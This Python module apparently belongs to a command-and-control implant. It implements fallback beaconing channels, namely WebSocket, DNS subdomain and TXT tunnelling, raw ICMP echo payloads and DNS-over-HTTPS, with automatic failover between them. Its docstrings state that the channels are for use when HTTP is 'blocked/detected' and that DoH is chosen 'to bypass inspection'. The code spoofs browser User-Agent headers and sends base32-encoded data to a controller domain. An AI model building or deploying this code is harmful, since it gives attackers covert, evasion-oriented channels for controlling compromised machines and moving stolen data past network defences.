"""
Fallback Communication Channels
Alternative beaconing methods when HTTP is blocked/detected

Channels:
- WebSocket: Persistent connection with HTTP upgrade
- DNS: TXT/A record-based communication
- ICMP: Ping-based covert channel
- DoH: DNS over HTTPS
"""
import os
import base64
import struct
import socket
import time
import random
import json
import hashlib
import threading
from typing import Dict, Optional, Callable, List, Tuple
from dataclasses import dataclass
from abc import ABC, abstractmethod


@dataclass
class ChannelConfig:
    """Base channel configuration"""
    enabled: bool = True
    priority: int = 1  # Lower = higher priority
    timeout: int = 30
    retry_count: int = 3


@dataclass
class WebSocketConfig(ChannelConfig):
    """WebSocket channel config"""
    uri: str = "/ws/beacon"
    ping_interval: int = 30
    reconnect_delay: int = 5


@dataclass
class DNSConfig(ChannelConfig):
    """DNS channel config"""
    domain: str = "beacon.example.com"
    record_type: str = "TXT"  # TXT, A, AAAA, CNAME
    nameserver: Optional[str] = None
    subdomain_length: int = 32


@dataclass
class ICMPConfig(ChannelConfig):
    """ICMP channel config"""
    target: str = "8.8.8.8"
    payload_size: int = 32
    sequence_start: int = 1


@dataclass
class DoHConfig(ChannelConfig):
    """DNS over HTTPS config"""
    provider: str = "cloudflare"  # cloudflare, google, quad9
    domain: str = "beacon.example.com"


class FallbackChannel(ABC):
    """Abstract base class for fallback channels"""
    
    def __init__(self, config: ChannelConfig):
        self.config = config
        self.is_connected = False
        self.last_activity = None
    
    @abstractmethod
    def connect(self) -> bool:
        """Establish connection"""
        pass
    
    @abstractmethod
    def send(self, data: bytes) -> bool:
        """Send data"""
        pass
    
    @abstractmethod
    def receive(self, timeout: int = None) -> Optional[bytes]:
        """Receive data"""
        pass
    
    @abstractmethod
    def disconnect(self):
        """Close connection"""
        pass
    
    def is_available(self) -> bool:
        """Check if channel is available"""
        return self.config.enabled


class WebSocketChannel(FallbackChannel):
    """
    WebSocket fallback channel.
    Persistent connection, lower latency than HTTP polling.
    """
    
    DOH_PROVIDERS = {
        "cloudflare": "https://cloudflare-dns.com/dns-query",
        "google": "https://dns.google/resolve",
        "quad9": "https://dns.quad9.net:5053/dns-query"
    }
    
    def __init__(self, host: str, port: int, config: WebSocketConfig = None):
        super().__init__(config or WebSocketConfig())
        self.host = host
        self.port = port
        self.ws = None
        self._recv_thread = None
        self._recv_queue = []
        self._running = False
    
    def connect(self) -> bool:
        """Connect via WebSocket"""
        try:
            import websocket
            
            protocol = "wss" if self.port == 443 else "ws"
            url = f"{protocol}://{self.host}:{self.port}{self.config.uri}"
            
            self.ws = websocket.create_connection(
                url,
                timeout=self.config.timeout,
                header={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    "Origin": f"https://{self.host}"
                }
            )
            
            self.is_connected = True
            self._running = True
            
            # Start receiver thread
            self._recv_thread = threading.Thread(target=self._receiver_loop)
            self._recv_thread.daemon = True
            self._recv_thread.start()
            
            return True
            
        except ImportError:
            print("[!] websocket-client not installed")
            return False
        except Exception as e:
            print(f"[!] WebSocket connect failed: {e}")
            return False
    
    def _receiver_loop(self):
        """Background receiver"""
        while self._running and self.ws:
            try:
                data = self.ws.recv()
                if data:
                    if isinstance(data, str):
                        data = data.encode()
                    self._recv_queue.append(data)
            except:
                break
    
    def send(self, data: bytes) -> bool:
        """Send data over WebSocket"""
        if not self.ws or not self.is_connected:
            return False
        
        try:
            # Encode as base64 for text frame
            encoded = base64.b64encode(data).decode()
            self.ws.send(encoded)
            self.last_activity = time.time()
            return True
        except Exception as e:
            print(f"[!] WebSocket send failed: {e}")
            self.is_connected = False
            return False
    
    def receive(self, timeout: int = None) -> Optional[bytes]:
        """Receive data from WebSocket"""
        timeout = timeout or self.config.timeout
        start = time.time()
        
        while time.time() - start < timeout:
            if self._recv_queue:
                data = self._recv_queue.pop(0)
                # Decode base64
                try:
                    return base64.b64decode(data)
                except:
                    return data
            time.sleep(0.1)
        
        return None
    
    def disconnect(self):
        """Close WebSocket connection"""
        self._running = False
        if self.ws:
            try:
                self.ws.close()
            except:
                pass
        self.is_connected = False


class DNSChannel(FallbackChannel):
    """
    DNS-based covert channel.
    Encodes data in DNS queries/responses.
    
    Methods:
    - TXT records: Most data per query
    - A records: IP address encoding
    - Subdomain encoding: Data in subdomain labels
    """
    
    def __init__(self, config: DNSConfig = None):
        super().__init__(config or DNSConfig())
        self.config: DNSConfig
        self._sequence = 0
    
    def connect(self) -> bool:
        """DNS channel doesn't need persistent connection"""
        self.is_connected = True
        return True
    
    def send(self, data: bytes) -> bool:
        """
        Send data via DNS query.
        Encodes data in subdomain labels.
        """
        try:
            # Encode data
            encoded = base64.b32encode(data).decode().lower().rstrip('=')
            
            # Split into DNS-safe labels (max 63 chars each)
            labels = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
            
            # Send each chunk as a DNS query
            for i, label in enumerate(labels):
                query = f"{self._sequence}.{i}.{label}.{self.config.domain}"
                self._dns_query(query, self.config.record_type)
                self._sequence += 1
            
            self.last_activity = time.time()
            return True
            
        except Exception as e:
            print(f"[!] DNS send failed: {e}")
            return False
    
    def receive(self, timeout: int = None) -> Optional[bytes]:
        """
        Receive data via DNS TXT record lookup.
        C2 server embeds response in TXT record.
        """
        try:
            # Query for response
            query = f"r.{self._sequence}.{self.config.domain}"
            response = self._dns_query(query, "TXT")
            
            if response:
                # Decode response
                try:
                    # Add padding if needed
                    padding = 8 - len(response) % 8
                    if padding != 8:
                        response += '=' * padding
                    return base64.b32decode(response.upper())
                except:
                    return response.encode() if isinstance(response, str) else response
            
            return None
            
        except Exception as e:
            print(f"[!] DNS receive failed: {e}")
            return None
    
    def _dns_query(self, query: str, record_type: str) -> Optional[str]:
        """Perform DNS query"""
        try:
            import dns.resolver
            
            resolver = dns.resolver.Resolver()
            if self.config.nameserver:
                resolver.nameservers = [self.config.nameserver]
            
            answers = resolver.resolve(query, record_type)
            
            if record_type == "TXT":
                for rdata in answers:
                    return str(rdata).strip('"')
            elif record_type == "A":
                for rdata in answers:
                    return str(rdata)
            
            return None
            
        except ImportError:
            # Fallback to socket
            return self._dns_query_socket(query, record_type)
        except Exception:
            return None
    
    def _dns_query_socket(self, query: str, record_type: str) -> Optional[str]:
        """DNS query using raw sockets (fallback)"""
        try:
            result = socket.gethostbyname(query)
            return result
        except:
            return None
    
    def disconnect(self):
        """DNS channel cleanup"""
        self.is_connected = False


class ICMPChannel(FallbackChannel):
    """
    ICMP-based covert channel.
    Encodes data in ICMP echo request/reply payloads.
    
    Note: Requires root/admin privileges.
    """
    
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    
    def __init__(self, config: ICMPConfig = None):
        super().__init__(config or ICMPConfig())
        self.config: ICMPConfig
        self._socket = None
        self._sequence = self.config.sequence_start
        self._identifier = os.getpid() & 0xFFFF
    
    def connect(self) -> bool:
        """Create raw ICMP socket"""
        try:
            self._socket = socket.socket(
                socket.AF_INET,
                socket.SOCK_RAW,
                socket.IPPROTO_ICMP
            )
            self._socket.settimeout(self.config.timeout)
            self.is_connected = True
            return True
        except PermissionError:
            print("[!] ICMP requires root/admin privileges")
            return False
        except Exception as e:
            print(f"[!] ICMP socket failed: {e}")
            return False
    
    def send(self, data: bytes) -> bool:
        """Send data via ICMP echo request"""
        if not self._socket:
            return False
        
        try:
            # Build ICMP packet
            packet = self._build_icmp_packet(data)
            
            # Send
            self._socket.sendto(packet, (self.config.target, 0))
            self._sequence += 1
            self.last_activity = time.time()
            return True
            
        except Exception as e:
            print(f"[!] ICMP send failed: {e}")
            return False
    
    def receive(self, timeout: int = None) -> Optional[bytes]:
        """Receive ICMP echo reply"""
        if not self._socket:
            return None
        
        timeout = timeout or self.config.timeout
        self._socket.settimeout(timeout)
        
        try:
            data, addr = self._socket.recvfrom(1024)
            
            # Parse ICMP reply (skip IP header - 20 bytes)
            icmp_header = data[20:28]
            icmp_type, code, checksum, pkt_id, sequence = struct.unpack(
                '!BBHHH', icmp_header
            )
            
            if icmp_type == self.ICMP_ECHO_REPLY:
                # Extract payload
                payload = data[28:]
                return payload
            
            return None
            
        except socket.timeout:
            return None
        except Exception as e:
            print(f"[!] ICMP receive failed: {e}")
            return None
    
    def _build_icmp_packet(self, payload: bytes) -> bytes:
        """Build ICMP echo request packet"""
        # Pad or truncate payload
        if len(payload) < self.config.payload_size:
            payload = payload + b'\x00' * (self.config.payload_size - len(payload))
        elif len(payload) > self.config.payload_size:
            payload = payload[:self.config.payload_size]
        
        # ICMP header: type(1), code(1), checksum(2), id(2), sequence(2)
        header = struct.pack(
            '!BBHHH',
            self.ICMP_ECHO_REQUEST,
            0,  # code
            0,  # checksum placeholder
            self._identifier,
            self._sequence
        )
        
        # Calculate checksum
        checksum = self._checksum(header + payload)
        
        # Rebuild header with checksum
        header = struct.pack(
            '!BBHHH',
            self.ICMP_ECHO_REQUEST,
            0,
            checksum,
            self._identifier,
            self._sequence
        )
        
        return header + payload
    
    def _checksum(self, data: bytes) -> int:
        """Calculate ICMP checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        total = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i+1]
            total += word
        
        total = (total >> 16) + (total & 0xFFFF)
        total += total >> 16
        
        return ~total & 0xFFFF
    
    def disconnect(self):
        """Close ICMP socket"""
        if self._socket:
            self._socket.close()
        self.is_connected = False


class DoHChannel(FallbackChannel):
    """
    DNS over HTTPS channel.
    Uses encrypted DNS to bypass inspection.
    """
    
    DOH_PROVIDERS = {
        "cloudflare": "https://cloudflare-dns.com/dns-query",
        "google": "https://dns.google/resolve",
        "quad9": "https://dns.quad9.net:5053/dns-query"
    }
    
    def __init__(self, config: DoHConfig = None):
        super().__init__(config or DoHConfig())
        self.config: DoHConfig
        self._sequence = 0
    
    def connect(self) -> bool:
        """DoH doesn't need persistent connection"""
        self.is_connected = True
        return True
    
    def send(self, data: bytes) -> bool:
        """Send data via DoH query"""
        try:
            import urllib.request
            import urllib.parse
            
            # Encode data in subdomain
            encoded = base64.b32encode(data).decode().lower().rstrip('=')
            query_name = f"{self._sequence}.{encoded[:60]}.{self.config.domain}"
            
            # Build DoH request
            provider_url = self.DOH_PROVIDERS.get(
                self.config.provider,
                self.DOH_PROVIDERS["cloudflare"]
            )
            
            url = f"{provider_url}?name={urllib.parse.quote(query_name)}&type=TXT"
            
            req = urllib.request.Request(url, headers={
                "Accept": "application/dns-json",
                "User-Agent": "Mozilla/5.0"
            })
            
            response = urllib.request.urlopen(req, timeout=self.config.timeout)
            self._sequence += 1
            self.last_activity = time.time()
            return True
            
        except Exception as e:
            print(f"[!] DoH send failed: {e}")
            return False
    
    def receive(self, timeout: int = None) -> Optional[bytes]:
        """Receive data via DoH TXT lookup"""
        try:
            import urllib.request
            import urllib.parse
            
            query_name = f"r.{self._sequence}.{self.config.domain}"
            
            provider_url = self.DOH_PROVIDERS.get(
                self.config.provider,
                self.DOH_PROVIDERS["cloudflare"]
            )
            
            url = f"{provider_url}?name={urllib.parse.quote(query_name)}&type=TXT"
            
            req = urllib.request.Request(url, headers={
                "Accept": "application/dns-json",
                "User-Agent": "Mozilla/5.0"
            })
            
            response = urllib.request.urlopen(req, timeout=timeout or self.config.timeout)
            data = json.loads(response.read().decode())
            
            # Extract TXT record
            if 'Answer' in data:
                for answer in data['Answer']:
                    if answer.get('type') == 16:  # TXT
                        txt_data = answer.get('data', '').strip('"')
                        # Decode
                        padding = 8 - len(txt_data) % 8
                        if padding != 8:
                            txt_data += '=' * padding
                        return base64.b32decode(txt_data.upper())
            
            return None
            
        except Exception as e:
            print(f"[!] DoH receive failed: {e}")
            return None
    
    def disconnect(self):
        """DoH cleanup"""
        self.is_connected = False


class FallbackManager:
    """
    Manage multiple fallback channels with automatic failover.
    """
    
    def __init__(self):
        self.channels: List[FallbackChannel] = []
        self.active_channel: Optional[FallbackChannel] = None
        self.primary_failed = False
    
    def add_channel(self, channel: FallbackChannel, priority: int = 10):
        """Add fallback channel"""
        channel.config.priority = priority
        self.channels.append(channel)
        # Sort by priority
        self.channels.sort(key=lambda c: c.config.priority)
    
    def remove_channel(self, channel: FallbackChannel):
        """Remove channel"""
        if channel in self.channels:
            self.channels.remove(channel)
    
    def connect(self) -> bool:
        """Connect to best available channel"""
        for channel in self.channels:
            if channel.config.enabled and channel.connect():
                self.active_channel = channel
                print(f"[*] Connected via {channel.__class__.__name__}")
                return True
        
        print("[!] All channels failed")
        return False
    
    def send(self, data: bytes) -> bool:
        """Send data through active channel with failover"""
        if self.active_channel and self.active_channel.is_connected:
            if self.active_channel.send(data):
                return True
        
        # Failover
        return self._failover_send(data)
    
    def _failover_send(self, data: bytes) -> bool:
        """Try alternate channels"""
        for channel in self.channels:
            if channel == self.active_channel:
                continue
            
            if channel.config.enabled:
                if channel.connect() and channel.send(data):
                    self.active_channel = channel
                    self.primary_failed = True
                    print(f"[*] Failover to {channel.__class__.__name__}")
                    return True
        
        return False
    
    def receive(self, timeout: int = 30) -> Optional[bytes]:
        """Receive data from active channel"""
        if self.active_channel and self.active_channel.is_connected:
            return self.active_channel.receive(timeout)
        return None
    
    def disconnect_all(self):
        """Disconnect all channels"""
        for channel in self.channels:
            channel.disconnect()
        self.active_channel = None
    
    def get_status(self) -> Dict:
        """Get channel status"""
        return {
            "active": self.active_channel.__class__.__name__ if self.active_channel else None,
            "primary_failed": self.primary_failed,
            "channels": [
                {
                    "type": c.__class__.__name__,
                    "enabled": c.config.enabled,
                    "connected": c.is_connected,
                    "priority": c.config.priority
                }
                for c in self.channels
            ]
        }


# Convenience functions
def create_websocket_channel(host: str, port: int = 443) -> WebSocketChannel:
    """Create WebSocket fallback channel"""
    return WebSocketChannel(host, port)


def create_dns_channel(domain: str) -> DNSChannel:
    """Create DNS fallback channel"""
    config = DNSConfig(domain=domain)
    return DNSChannel(config)


def create_icmp_channel(target: str = "8.8.8.8") -> ICMPChannel:
    """Create ICMP fallback channel"""
    config = ICMPConfig(target=target)
    return ICMPChannel(config)


def create_doh_channel(domain: str, provider: str = "cloudflare") -> DoHChannel:
    """Create DoH fallback channel"""
    config = DoHConfig(domain=domain, provider=provider)
    return DoHChannel(config)
